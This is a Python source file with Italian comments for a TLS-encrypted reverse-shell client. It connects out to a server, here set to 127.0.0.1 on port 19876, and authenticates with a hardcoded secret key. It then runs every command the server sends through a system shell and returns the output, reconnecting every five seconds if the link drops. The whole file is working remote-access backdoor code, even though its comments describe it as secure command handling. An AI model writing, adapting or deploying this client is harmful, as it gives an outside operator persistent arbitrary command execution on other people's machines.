import os
import socket
import subprocess
import sys
import time
import ssl

SERVER_CERT = "server_cert.pem"  # Certificato del server
CLIENT_KEY = "client_key.pem"    # Chiave privata del client (opzionale)
SECRET_KEY = "MySuperSecretKey"  # Chiave per autenticazione con il server

def receiver(s):
    """Ricevi ed esegui comandi dal server in modo sicuro."""
    try:
        # Invia la chiave segreta per autenticarsi
        s.sendall(SECRET_KEY.encode())

        response = s.recv(1024).decode()
        if response != "AUTH_SUCCESS":
            print("[!] Autenticazione fallita. Disconnessione...")
            return
        
        print("[+] Autenticazione riuscita. Attendo comandi...")

        while True:
            cmd_bytes = s.recv(4096)
            if not cmd_bytes:
                print("[!] Connessione persa. Uscita...")
                break

            cmd = cmd_bytes.decode("utf-8").strip()

            # Gestione comando 'cd'
            if cmd.startswith("cd "):
                try:
                    os.chdir(cmd[3:])
                    s.sendall(b"Cambiata directory\n$: ")
                except FileNotFoundError:
                    s.sendall(b"Errore: Directory non trovata\n$: ")
                continue

            # Esegui altri comandi di sistema
            if cmd:
                p = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                data = (p.stdout + p.stderr).encode()
                s.sendall(data + b"$: ")
    except Exception as e:
        print(f"[!] Errore: {e}")
    finally:
        s.close()

def connect(address):
    """Prova a connetterti al server TLS con tentativi di riconnessione."""
    while True:
        try:
            raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Creazione del contesto SSL
            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            context.load_verify_locations(SERVER_CERT)

            # Connessione sicura con il server
            s = context.wrap_socket(raw_socket, server_hostname=address[0])
            s.connect(address)
            print(f"[+] Connessione sicura stabilita con {address}")

            receiver(s)
        except socket.error as error:
            print(f"[!] Connessione fallita: {error}")
            print("[*] Ritento la connessione tra 5 secondi...")
            time.sleep(5)  # Aspetta prima di ritentare
        except KeyboardInterrupt:
            print("\n[!] Interruzione manuale. Uscita...")
            sys.exit()

if __name__ == "__main__":
    HOST = "127.0.0.1"
    PORT = 19876
    connect((HOST, PORT))
